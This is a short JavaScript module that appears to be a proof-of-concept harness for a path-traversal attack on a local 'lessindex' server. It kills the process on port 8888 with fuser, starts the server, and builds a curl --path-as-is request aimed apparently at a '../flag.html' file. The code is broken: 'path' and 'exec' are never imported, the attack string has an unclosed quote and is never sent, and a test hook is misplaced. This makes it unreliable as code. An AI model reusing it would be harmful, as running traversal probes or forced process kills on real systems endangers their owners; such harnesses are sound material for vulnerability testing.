function exploitFunction(payload) {
    const { execSync } = require("child_process");
    const sleep = require("sleep");
    const { genstr } = payload; // Use the genstr function from the payload

    afterAll(() => {
        try {
            execSync("fuser -k 8888/tcp");
        } catch (e) {}
    });

    const pathToFlag = path.resolve(__dirname, "../flag.html");

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr(50)}`; // Use the genstr function

    try {
        execSync("fuser -k 8888/tcp", () => {});
    } catch (e) {}

    let server = "node ./node_modules/lessindex/index.js";
    let exe = exec(server, (error, stdout) => {
        if (stdout) {
            return stdout;
        }
        throw new Error("Server did not start correctly.");
    });

    sleep.sleep(2);

    return exe;
}

module.exports = { exploitFunction };